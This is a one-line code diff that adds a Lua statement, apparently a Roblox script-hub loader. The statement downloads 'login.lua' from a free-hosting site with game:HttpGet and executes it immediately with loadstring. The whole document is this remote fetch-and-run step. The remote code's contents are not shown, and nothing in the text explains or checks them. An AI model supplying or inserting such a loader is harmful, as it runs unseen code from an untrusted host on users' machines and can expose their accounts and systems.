@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://akamehub.000webhostapp.com/login.lua", true))();
